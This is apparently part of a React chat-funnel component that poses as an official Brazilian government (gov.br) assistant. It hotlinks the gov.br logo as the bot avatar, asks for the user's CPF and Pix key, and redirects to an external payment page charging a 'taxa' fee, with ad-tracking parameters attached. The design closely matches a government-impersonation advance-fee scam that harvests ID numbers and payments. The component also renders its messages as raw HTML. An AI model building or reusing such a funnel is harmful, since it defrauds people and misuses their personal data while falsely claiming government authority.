    };
  }, [currentStepKey, initialParams, flowVariables]); 

  const handleOptionClick = (option: ChatOption) => {
    setMessages(prev => [...prev, { id: `user-${Date.now()}`, sender: 'user', text: option.text }]);

    const currentStepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (option.action === 'setChavePixToUserCPF') {
        const cpfToSet = flowVariables.userCPF || "CPF não disponível";
        setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
    } else if (currentStepConfig?.internalActions && option.action && currentStepConfig.internalActions[option.action]) {
        const actionDetail = currentStepConfig.internalActions[option.action];
        if (actionDetail.type === 'setVariable') {
            let valueFromSource = actionDetail.valueFrom;
            let valueToSet = "";
            if (valueFromSource === "userCPF") valueToSet = flowVariables.userCPF || "";
            // @ts-ignore
            else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource] || "";
            setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
        }
    }

    if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
        let finalPaymentUrl = formatText(option.paymentUrlTemplate);
        const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
        const taxaValorNum = parseFloat(taxaValorCleaned);
        finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
        const userNameEncoded = encodeURIComponent(flowVariables.userName || "");
        finalPaymentUrl = finalPaymentUrl.replace("{{userName_encoded}}", userNameEncoded);
        const userCPFNumbersOnly = (flowVariables.userCPF || "").replace(/\D/g, '');
        finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);
        
        try {
            const url = new URL(finalPaymentUrl);
             Object.entries(initialParams).forEach(([key, value]) => {
                if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                    url.searchParams.set(key, value as string);
                }
            });
            window.location.href = url.toString();
        } catch (e) {
            console.error("Invalid payment URL:", finalPaymentUrl, e);
            setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
        }
        return;
    }

    if (option.nextStep) {
      handleUserActionAndNavigate(option.nextStep);
    } else if (!option.action) {
        console.warn("Option clicked with no nextStep and no action:", option);
    }
  };

  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps];
    if (stepConfig?.type !== 'videoDisplay') return;

    setShowVideoPlaceholderOverlay(false);
    
    if ((stepConfig as FlowStep).nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
        // No need for a timer here, directly navigate.
        // The next step will have its own appearanceDelayMs.
        handleUserActionAndNavigate(stepConfig.nextStep as string);
    }
  };

  const handleTextInputFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentTextInputConfig || !textInputValue.trim()) {
        const tempMsgId = `err-input-${Date.now()}`;
        setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
        setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
        return;
    }
    
    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);

    if (currentTextInputConfig.variableToSet === 'chavePix') {
        setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
    }

    setIsTextInputActive(false); 
    setTextInputValue("");
    
    const nextStepKey = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.nextStep;
    if (nextStepKey) {
        handleUserActionAndNavigate(nextStepKey);
    }
  };

  const getIconComponent = (iconName?: string) => {
    if (!iconName) return null;
    if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
    if (iconName.includes('currency_dollar')) return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0}}>💰</span>;
    return null;
  }


  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {videoPlaceholderData.current && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentVideoMessage && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding: '10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }}>{currentVideoMessage}</p>}
          <div
            onClick={handleVideoThumbnailClick}
            className="video-placeholder-wrapper"
            style={{
              position: 'relative', width: '100%', aspectRatio: '16/9',
              margin: '0 auto', borderRadius: '8px', overflow: 'hidden',
              backgroundColor: '#333', cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'
            }}
          >
            {showVideoPlaceholderOverlay && (
              <div
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px', textAlign: 'center' }}>
                  {formatText(videoPlaceholderData.current?.thumbnailText) || "Clique para Ouvir"}
                </span>
              </div>
            )}
             { !showVideoPlaceholderOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
          </div>
        </div>
      )}


      {isLoadingStep && loadingMessage && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#1451b4' }} />
          <p style={{ fontSize: '16px', color: '#333', whiteSpace: 'pre-line' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && !isLoadingStep && (
        <div className="image-step-container" style={{ padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentImageDetails.message && <p className="bot-message" style={{ background: '#e9ecef', color: '#333', borderRadius: '12px', boxShadow: 'none', padding:'10px 15px', marginBottom: '10px', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentImageDetails.message}}/>}
          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
        </div>
      )}

      {currentDisplayMessage && !isLoadingStep && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}>
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '')}
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`}
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && !isLoadingStep && !videoPlaceholderData.current && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && (
         <div className="message-container bot-message-container">
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container { display: flex; margin-bottom: 12px; max-width: 90%; }
        .bot-message-container { align-self: flex-start; }
        .user-message-container { align-self: flex-end; flex-direction: row-reverse; }

        .bot-avatar {
          width: 32px;
          height: 32px;
          border-radius: 50%;
          margin-right: 8px;
          margin-top: 4px;
          align-self: flex-start;
          object-fit: cover;
        }

        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .bot-message {
          background-color: #e9ecef; 
          color: #333;
          border-bottom-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff; 
          color: white;
          border-bottom-right-radius: 4px;
        }
        .user-message-container .user-message {
            margin-left: auto;
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap; 
          align-items: flex-start; 
          justify-content: flex-start; 
          gap: 8px;
        }
        .chat-option-button {
          background-color: #007bff; 
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 25px; 
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover {
          background-color: #0056b3;
        }

        .chat-option-button.primary_cta_button_gov_style {
          background-color: #16a34a; 
          border-color: #16a34a;
          color: white;
          font-weight: bold;
        }
        .chat-option-button.primary_cta_button_gov_style:hover {
          background-color: #15803d;
          border-color: #15803d;
          color: white;
        }

        .chat-option-button.secondary_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #007bff; 
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.secondary_link_button_gov_style:hover {
          color: #0056b3;
          background-color: transparent;
        }

        .chat-option-button.destructive_link_button_gov_style {
          background-color: transparent;
          border: none;
          color: #dc3545; 
          text-decoration: underline;
          padding: 4px 0;
          box-shadow: none;
          font-size: 14px;
        }
        .chat-option-button.destructive_link_button_gov_style:hover {
          color: #c82333;
          background-color: transparent;
        }

        .typing-indicator {
          display: inline-flex;
          align-items: center;
          padding: 10px 15px;
        }
        .typing-indicator .dot {
          width: 8px;
          height: 8px;
          margin: 0 2px;
          background-color: #aaa;
          border-radius: 50%;
          animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
          0%, 80%, 100% { transform: scale(0); }
          40% { transform: scale(1); }
        }
        .display-message-block .bot-message {
            width: auto;
            max-width: 100%;
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;


    